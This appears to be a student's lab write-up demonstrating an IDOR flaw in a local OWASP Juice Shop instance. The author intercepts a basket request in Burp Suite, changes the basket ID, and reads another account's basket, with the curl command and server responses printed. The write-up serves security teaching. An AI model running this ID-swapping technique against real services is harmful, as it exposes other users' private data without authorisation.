# LAB 03_IDOR

1. I created two different accounts on Juice Shop (gabriele@hotmail.it and lorenzo@hotmail.it).
2. I logged into the first account.
3. I created a shopping basket in the first account and added some products.
<div style="display:flex; flex-wrap: wrap; gap:10px; align-items:flex-start;">
  <img src="./img/1.png" alt="Image 1" style="width:30%; height:auto;">
  <img src="./img/2.png" alt="Image 2" style="width:60%; height:auto;">
</div>

4. I logged out and logged in with the second account (lorenzo@hotmail.it). As expected, I couldn't see Gabriele’s shopping basket.
   I clicked on the basket icon (even though it was empty) and observed the behavior in Burp Suite: I noticed a GET request like this:

   `GET /rest/basket/7 HTTP/1.1`

   It’s easy to understand that the number **7** actually identifies the basket ID, one for each user.  
   I simply replaced **7** with **6** and I was able to see Gabriele’s basket!

   <img src="./img/3.png" alt="Image 3" style="width:60%; height:auto;">

5. I exported the cURL command directly from Burp Suite (right-click → *Copy as curl command (bash)*).  
   I could reproduce the attack from the terminal by simply changing the basket number as before:

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 192.168.1.200:4000' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...' \
    -H $'Accept-Language: en-GB,en;q=0.9' -H $'Accept: application/json, text/plain, */*' \
    -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...' \
    -H $'Referer: http://192.168.1.200:4000/' -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'If-None-Match: W/"9a-zAtrfavzldpnfscKfRvJiJmdZ0o"' -H $'Connection: keep-alive' \
    -b $'language=en; ... token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...' \
    $'http://192.168.1.200:4000/rest/basket/7'
```
I received the following response:
```bash
HTTP/1.1 304 Not Modified
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
ETag: W/"9a-zAtrfavzldpnfscKfRvJiJmdZ0o"
Date: Tue, 18 Nov 2025 18:52:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
6. I modified the last number in the URL after .../basket/, replacing 7 with 6.
This time, the server returned the following response:
```bash
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 996
ETag: W/"3e4-FJYg2NsWSbboQkxqVDoKH+rhSGk"
Vary: Accept-Encoding
Date: Tue, 18 Nov 2025 18:49:46 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":{"id":6,"coupon":null,"UserId":23,"createdAt":"2025-11-18T15:33:54.334Z","updatedAt":"2025-11-18T15:33:54.334Z","Products":[{"id":6,"name":"Banana Juice (1000ml)","description":"Monkeys love it the most.","price":1.99,"deluxePrice":1.99,"image":"banana_juice.jpg","createdAt":"2025-11-18T15:21:27.084Z","updatedAt":"2025-11-18T15:21:27.084Z","deletedAt":null,"BasketItem":{"ProductId":6,"BasketId":6,"id":9,"quantity":1,"createdAt":"2025-11-18T15:34:27.857Z","updatedAt":"2025-11-18T15:34:27.857Z"}},{"id":30,"name":"Carrot Juice (1000ml)","description":"As the old German saying goes: \"Carrots are good for the eyes. Or has anyone ever seen a rabbit with glasses?\"","price":2.99,"deluxePrice":2.99,"image":"carrot_juice.jpeg","createdAt":"2025-11-18T15:21:27.101Z","updatedAt":"2025-11-18T15:21:27.101Z","deletedAt":null,"BasketItem":{"ProductId":30,"BasketId":6,"id":10,"quantity":1,"createdAt":"2025-11-18T15:34:29.939Z","updatedAt":"2025-11-18T15:34:29.939Z"}}]}}%
```
It's been not necessary change the authentication token!
This demonstrates an IDOR vulnerability, where changing the basket ID in the request allows an authenticated user to access another user’s basket.